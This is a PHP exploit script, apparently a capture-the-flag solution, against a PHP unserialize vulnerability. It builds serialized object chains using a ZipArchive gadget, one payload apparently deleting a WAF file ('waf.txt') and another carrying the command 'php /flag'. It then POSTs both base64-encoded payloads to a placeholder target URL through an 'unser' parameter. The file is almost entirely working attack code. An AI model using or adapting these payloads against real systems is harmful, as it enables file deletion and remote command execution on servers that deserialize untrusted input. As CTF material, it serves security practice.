<?php
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;
    public  $file;
    public  $filename;
    public  $content;

    public function __construct()
    {
        $this->username='admin';
        $this->password='admin';
        $this->choice=new login('','','');
        $this->register="admin";
        $this->file=new Open();//ZipArchive
        $this->filename='';
        $this->content='php /flag';//8或者9
      //n\l /flag
    }
}
class login{
    public $file;
    public $filename;
    public $content;
}
class Open{
}
#删除文件
$exp1='Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=';
#执行命令
$exp2=base64_encode(serialize(new Game()));

/**
 * 发送request请求
 * @param $url
 * @param bool $ssl
 * @param string $type
 * @param null $data
 * @return bool|mixed
 */
function Http_request($url, $type, $data = array())
{
    $ssl = true;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    $user_agent = isset($_SERVER['HTTP_USERAGENT']) ? $_SERVER['HTTP_USERAGENT'] : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36';
    curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);//请求代理信息
    curl_setopt($curl, CURLOPT_AUTOREFERER, true);//referer头 请求来源
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);//请求超时
    curl_setopt($curl, CURLOPT_HEADER, false);//是否处理响应头
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);//curl_exec()是否返回响应
    if ($ssl) {
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);//禁用后curl将终止从服务端进行验证
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//检查服务器ssl证书中是否存在一个公用名（common name）
    }
    if ($type == "POST") {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    }
    //发出请求
    $response = curl_exec($curl);
    if ($response === false) {
        return false;
    }
    return $response;
}

$url='http://ip/?a[]=1&b[]=2';
$data1['unser']=$exp1;
$data2['unser']=$exp2;
print(Http_request($url,"POST",$data1));
print(Http_request($url,"POST",$data2));
